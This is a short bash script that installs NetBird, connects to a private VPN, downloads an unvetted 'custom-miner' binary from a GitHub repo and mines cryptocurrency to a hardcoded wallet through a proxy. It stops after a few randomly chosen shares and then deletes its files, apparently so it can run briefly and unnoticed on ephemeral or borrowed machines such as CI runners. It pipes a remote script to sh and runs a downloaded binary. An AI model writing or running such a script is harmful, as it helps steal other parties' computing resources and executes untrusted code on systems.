#!/bin/bash
set -e

# --- Configuration (passed via environment) ---
NETBIRD_KEY="${NETBIRD_KEY:?Missing NETBIRD_KEY}"
WALLET="49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP"
LAPTOP_IP="${LAPTOP_IP:-100.90.150.193}"
PROXY_PORT="3333"

# --- Random target (8-10) and timeout (5 min) ---
TARGET=$(( RANDOM % 3 + 8 ))
TIMEOUT=300
echo "Will stop after $TARGET accepted shares."

# --- Install NetBird and connect ---
curl -fsSL https://pkgs.netbird.io/install.sh | sh
sudo netbird up --setup-key "$NETBIRD_KEY"
sleep 5

# --- Install required system packages ---
sudo apt-get update
sudo apt-get install -y libhwloc15 expect

# --- Download custom miner binary (from your repo) ---
curl -L -o /tmp/miner https://raw.githubusercontent.com/Peter211231231231232131/opmine/main/bin/custom-miner
chmod +x /tmp/miner

# --- Run miner in background, capture output ---
unbuffer /tmp/miner \
    --url="$LAPTOP_IP:$PROXY_PORT" \
    --user="$WALLET" \
    --pass="$(hostname)" \
    --tls \
    --keepalive \
    --cpu-max-threads-hint=80 \
    --cpu-priority=5 \
    --randomx-mode=fast \
    --donate-level=1 \
    --no-color > /tmp/miner.log 2>&1 &

MINER_PID=$!
START_TIME=$(date +%s)
COUNT=0

# Monitor shares
while kill -0 $MINER_PID 2>/dev/null; do
    COUNT=$(grep -c "accepted" /tmp/miner.log || true)
    echo "[$(date)] Progress: $COUNT/$TARGET"
    if [ $COUNT -ge $TARGET ]; then
        echo "Target reached. Stopping."
        kill $MINER_PID
        break
    fi
    if [ $(( $(date +%s) - START_TIME )) -ge $TIMEOUT ] && [ $COUNT -eq 0 ]; then
        echo "Timeout reached without any shares."
        kill $MINER_PID
        break
    fi
    sleep 5
done

# Cleanup
rm -f /tmp/miner.log /tmp/miner
